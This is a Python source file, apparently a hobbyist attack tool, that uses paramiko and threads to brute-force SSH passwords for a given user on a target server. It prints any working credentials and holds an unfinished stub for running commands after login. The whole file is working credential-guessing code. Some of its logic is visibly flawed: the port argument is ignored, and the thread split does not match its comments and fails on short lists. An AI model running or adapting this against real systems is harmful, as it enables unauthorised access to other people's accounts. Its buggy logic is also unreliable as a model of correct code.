import paramiko


def ssh_brute_pass(server, user, pass_list, port=22):
    '''
    This function assumes you know the user to ssh with
    and bruteforces the password
    '''
    import numpy as np
    import threading

    def ssh_list(server, username, passwords, port=22):
        for passw in passwords:
            ssh(server, username, passw, port=22)
        return None

    # count the entries in the pass_list
    number_of_pass = len(pass_list)
    # I am assuming to use 12 concurrent threads
    password_for_list = number_of_pass // 12
    # We split the list in a definite number of sub_arrays
    list_of_arrays = np.array_split(np.array(pass_list), password_for_list)
    try:
        threads = list()
        # print(len(list_of_arrays))
        for i in range(len(list_of_arrays)):
            # print(list_of_arrays[i])
            x = threading.Thread(target=ssh_list, args=(
               server, user, list_of_arrays[i], port))
            threads.append(x)
            x.start()
    except:
        print("There were problems")
        return 1
    return 0


def ssh_command(server, username, password, cmd='id', port=22):
    # connect to SSHClient
    # (stdin, stdout, stderr) = client.exec_command(command, timeout=0.5)
    # cmd_output = stdout.read()
    # print(command, " : ", cmd_output)
    print("Not Yet Implemented")
    return None


def ssh(server, username, password, port=22, verbose=False):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(server, port, username, password, timeout=0.5)
        print(f"Successfull login with u: {username} p: {password}")
        out_code = 0
    except paramiko.ssh_exception.NoValidConnectionsError:
        if verbose:
            print("Socket Timeout - SSH might not be listening...")
        out_code = 2
    except paramiko.ssh_exception.AuthenticationException:
        if verbose:
            print(f"{username} : {password} not correct")
        out_code = 1
    except paramiko.ssh_exception.PartialAuthentication:
        print("a")
        out_code = 1
    finally:
        client.close()
    return out_code
